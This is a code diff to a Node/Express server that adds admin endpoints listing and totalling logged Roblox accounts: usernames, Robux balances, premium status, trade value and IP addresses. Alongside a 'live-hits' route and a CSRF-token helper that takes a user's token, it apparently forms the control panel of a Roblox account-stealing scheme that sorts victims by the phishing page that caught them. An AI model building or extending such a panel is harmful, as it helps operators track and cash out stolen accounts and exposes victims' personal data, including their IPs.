@@ -513,6 +513,68 @@ app.get('/api/live-hits', async (req, res) => {
   }
 });
 
+// API endpoint for admin stats (protected)
+app.get('/api/admin/stats', requireAdminPassword, async (req, res) => {
+  try {
+    const logsRef = db.ref('user_logs');
+    const snapshot = await logsRef.once('value');
+    const allLogs = snapshot.val() || {};
+    
+    const logs = Object.values(allLogs);
+
+    // Calculate all-time stats (not just today)
+    const totalUsers = logs.length;
+    const totalRobux = logs.reduce((sum, log) => sum + (log.userData.robux || 0), 0);
+    const totalSummary = logs.reduce((sum, log) => sum + (log.userData.summary || 0), 0);
+    const premiumUsers = logs.filter(log => log.userData.premium).length;
+    
+    // Count unique directories from all logs
+    const directories = new Set(logs.map(log => log.context?.directory).filter(dir => dir));
+    const activeDirectories = directories.size;
+
+    res.json({
+      totalUsers,
+      totalRobux,
+      totalSummary,
+      premiumUsers,
+      activeDirectories
+    });
+
+  } catch (error) {
+    console.error('Error getting admin stats:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
+// API endpoint for admin logs (protected)
+app.get('/api/admin/logs', requireAdminPassword, async (req, res) => {
+  try {
+    const logsRef = db.ref('user_logs');
+    const logsQuery = logsRef.orderByChild('timestamp').limitToLast(50);
+    const snapshot = await logsQuery.once('value');
+    const logs = snapshot.val() || {};
+    
+    const formattedLogs = Object.values(logs)
+      .sort((a, b) => new Date(b.timestamp) - new Date(a.timestamp))
+      .map(log => ({
+        username: log.userData.username || 'Unknown',
+        timestamp: log.timestamp,
+        robux: log.userData.robux || 0,
+        premium: log.userData.premium || false,
+        rap: log.userData.rap || 0,
+        directory: log.context?.directory || 'main',
+        subdirectory: log.context?.subdirectory || null,
+        ip: log.context?.ip || 'Unknown'
+      }));
+
+    res.json(formattedLogs);
+
+  } catch (error) {
+    console.error('Error getting admin logs:', error);
+    res.status(500).json({ error: 'Server error' });
+  }
+});
+
 // Function to get CSRF token for Roblox API requests
 async function getRobloxCSRFToken(token) {
   try {
